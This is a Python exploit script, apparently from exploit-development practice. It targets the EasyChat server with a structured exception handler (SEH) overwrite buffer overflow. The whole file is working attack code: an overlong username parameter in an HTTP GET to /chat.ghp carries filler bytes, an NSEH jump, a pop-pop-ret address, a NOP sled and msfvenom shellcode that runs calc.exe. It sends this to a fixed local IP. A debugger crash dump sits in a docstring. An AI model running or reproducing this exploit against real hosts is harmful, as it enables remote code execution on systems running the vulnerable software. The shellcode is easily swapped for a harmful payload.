import socket
from struct import pack

def sendBuffer(ip, port, buffer):
    try:
        print("[*] - Attempting to send buffer \n")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(buffer)
        s.close()
        print("[*] - Buffer sent \n")
    except Exception as e:
        print("[-] - Failed to send buffer \n")
        print(str(e))

def main():
    """
    02706a68: ntdll!_except_handler4+0 (7778ae60)
    CRT scope  0, func:   ntdll!RtlpFreeHeap+13e4 (77755124)
    02706b28: EasyChat+46a60 (00446a60)
    02706d94: 34684133 - 221
    Invalid exception stack at 68413268 - 217

    """
    ip = "192.168.1.8"
    port = 80
    size = 3000
    # x20 x00

    # msfvenom -p windows/exec cmd=calc.exe -b "\x00\x20" -f py -v shellcode EXITFUNC=thread
    shellcode =  b""
    shellcode += b"\xda\xd3\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31"
    shellcode += b"\xbf\x81\x87\x21\xdd\x31\x78\x18\x03\x78\x18"
    shellcode += b"\x83\xc0\x85\x65\xd4\x21\x6d\xeb\x17\xda\x6d"
    shellcode += b"\x8c\x9e\x3f\x5c\x8c\xc5\x34\xce\x3c\x8d\x19"
    shellcode += b"\xe2\xb7\xc3\x89\x71\xb5\xcb\xbe\x32\x70\x2a"
    shellcode += b"\xf0\xc3\x29\x0e\x93\x47\x30\x43\x73\x76\xfb"
    shellcode += b"\x96\x72\xbf\xe6\x5b\x26\x68\x6c\xc9\xd7\x1d"
    shellcode += b"\x38\xd2\x5c\x6d\xac\x52\x80\x25\xcf\x73\x17"
    shellcode += b"\x3e\x96\x53\x99\x93\xa2\xdd\x81\xf0\x8f\x94"
    shellcode += b"\x3a\xc2\x64\x27\xeb\x1b\x84\x84\xd2\x94\x77"
    shellcode += b"\xd4\x13\x12\x68\xa3\x6d\x61\x15\xb4\xa9\x18"
    shellcode += b"\xc1\x31\x2a\xba\x82\xe2\x96\x3b\x46\x74\x5c"
    shellcode += b"\x37\x23\xf2\x3a\x5b\xb2\xd7\x30\x67\x3f\xd6"
    shellcode += b"\x96\xee\x7b\xfd\x32\xab\xd8\x9c\x63\x11\x8e"
    shellcode += b"\xa1\x74\xfa\x6f\x04\xfe\x16\x7b\x35\x5d\x7c"
    shellcode += b"\x7a\xcb\xdb\x32\x7c\xd3\xe3\x62\x15\xe2\x68"
    shellcode += b"\xed\x62\xfb\xba\x4a\x8c\x19\x6f\xa6\x25\x84"
    shellcode += b"\xfa\x0b\x28\x37\xd1\x4f\x55\xb4\xd0\x2f\xa2"
    shellcode += b"\xa4\x90\x2a\xee\x62\x48\x46\x7f\x07\x6e\xf5"
    shellcode += b"\x80\x02\x0d\x98\x12\xce\xfc\x3f\x93\x75\x01"
    nopsled = b"\x90" * 100
    inputBuffer = b"\x41" * 217
    inputBuffer+= pack("<L", (0x06eb9090)) #NSEH jumping to shellcode 
    inputBuffer+= pack("<L", (0x10018aff)) #SEH - pop esi, pop ecx, ret
    inputBuffer+= nopsled
    inputBuffer+= shellcode
    inputBuffer+= b"\x90" * (size - len(inputBuffer)) ## Filler/shellcode

    request = b"GET /chat.ghp?username=" + inputBuffer + b"&password=&room=1&sex=2 HTTP/1.1" + b"\r\n"
    request += b"Host: " + ip.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
    sendBuffer(ip, port, request)
if __name__ == '__main__':
    main()